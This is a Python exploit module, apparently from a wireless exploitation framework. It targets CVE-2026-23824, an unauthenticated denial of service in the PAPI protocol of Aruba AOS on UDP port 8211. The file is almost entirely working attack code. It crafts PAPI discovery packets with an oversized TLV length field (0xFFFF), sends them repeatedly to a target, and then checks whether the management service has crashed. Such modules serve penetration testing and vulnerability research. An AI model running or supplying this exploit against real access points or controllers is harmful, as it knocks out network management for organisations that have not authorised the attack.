# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Aruba AOS Unauthenticated Denial of Service (CVE-2026-23824).

    Aruba AOS for Instant Access Points and Mobility Controllers
    contains an unauthenticated denial of service vulnerability in the
    PAPI (Process Application Programming Interface) protocol handler
    on UDP port 8211.  A crafted PAPI message with an oversized TLV
    (Type-Length-Value) field causes the PAPI process to crash,
    resulting in AP management disruption.

    PAPI is Aruba's proprietary control plane protocol used for
    communication between controllers and APs.  No authentication is
    required for the initial message exchange.

    CVSS v3.1: 7.5 (High), AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Aruba AOS Unauthenticated DoS via PAPI Protocol (CVE-2026-23824)",
        "description": (
            "Exploits CVE-2026-23824 in Aruba AOS PAPI protocol handler. "
            "A crafted PAPI message with oversized TLV fields crashes the "
            "PAPI process on UDP port 8211, causing DoS for AP management. "
            "No authentication required."
        ),
        "authors": (
            "HPE Aruba Security Advisory",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23824",
            "https://www.arubanetworks.com/assets/alert/",
        ),
        "disclosure_date": "2026-05-15",
        "platform": "aruba_aos",
        "arch": "all",
        "privileged": False,
        "targets": (
            "AOS-8 before 8.12.0.4",
            "AOS-10 before 10.6.0.3",
            "Aruba Instant APs (all models)",
        ),
    }

    target = OptIP("", "Target AP/Controller IP address")
    port = OptPort(8211, "PAPI protocol port (default 8211)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    repeat_count = OptInteger(5, "Number of malformed PAPI packets to send")

    # PAPI protocol constants
    _PAPI_MAGIC = 0x4972
    _PAPI_VERSION = 1
    _MSG_TYPE_DISCOVERY = 0x0001
    _TLV_HOSTNAME = 0x0001
    _TLV_SERIAL = 0x0003

    def _build_papi_header(self, msg_type: int, payload_len: int) -> bytes:
        """Build a PAPI protocol header."""
        return struct.pack(
            ">HHIHH",
            self._PAPI_MAGIC,
            self._PAPI_VERSION,
            0,
            msg_type,
            payload_len,
        )

    def _build_tlv(self, tlv_type: int, data: bytes) -> bytes:
        """Build a PAPI TLV field."""
        return struct.pack(">HH", tlv_type, len(data)) + data

    def _build_malformed_papi(self) -> bytes:
        """Build a PAPI message with oversized TLV that crashes the parser."""
        hostname_tlv = self._build_tlv(self._TLV_HOSTNAME, b"WirelessXPL")
        # Malformed TLV: declared length 0xFFFF but only 64 bytes of data
        malformed_tlv = struct.pack(">HH", self._TLV_SERIAL, 0xFFFF) + b"\x42" * 64
        payload = hostname_tlv + malformed_tlv
        header = self._build_papi_header(self._MSG_TYPE_DISCOVERY, len(payload))
        return header + payload

    def _build_normal_papi(self) -> bytes:
        """Build a normal PAPI discovery message."""
        hostname_tlv = self._build_tlv(self._TLV_HOSTNAME, b"probe")
        serial_tlv = self._build_tlv(self._TLV_SERIAL, b"WXPL0001")
        payload = hostname_tlv + serial_tlv
        header = self._build_papi_header(self._MSG_TYPE_DISCOVERY, len(payload))
        return header + payload

    def _send_udp(self, data: bytes) -> tuple[bool, bytes]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.sendto(data, (str(self.target), int(self.port)))
            try:
                resp, _ = sock.recvfrom(4096)
                return True, resp
            except (TimeoutError, OSError):
                return True, b""
            finally:
                sock.close()
        except OSError:
            return False, b""

    @mute
    def check(self) -> bool:
        """Verify the PAPI service is reachable."""
        pkt = self._build_normal_papi()
        sent, _ = self._send_udp(pkt)
        return sent

    def run(self) -> None:
        if not self.target:
            print_error("target is required")
            return

        if not self.check():
            print_error(f"Cannot reach PAPI service at {self.target}:{self.port}")
            return

        print_success("PAPI service reachable; sending malformed TLV packets")
        self._exploit()

    def _exploit(self) -> None:
        normal_pkt = self._build_normal_papi()
        malformed_pkt = self._build_malformed_papi()

        print_status("Phase 1: Sending normal PAPI discovery")
        self._send_udp(normal_pkt)
        time.sleep(0.2)

        print_status(
            f"Phase 2: Sending {self.repeat_count} malformed PAPI packets "
            "(oversized TLV length 0xFFFF)"
        )
        for i in range(self.repeat_count):
            self._send_udp(malformed_pkt)
            time.sleep(0.05)

        time.sleep(1.0)
        print_status("Phase 3: Checking PAPI service status")
        ok, resp = self._send_udp(normal_pkt)

        if ok and not resp:
            print_success(
                "PAPI service is no longer responding. The malformed TLV "
                "likely crashed the PAPI process. AP management will be "
                "disrupted until the service restarts."
            )
        elif ok and resp:
            print_info("PAPI service still responding; target may be patched.")
        else:
            print_error("Cannot reach target.")
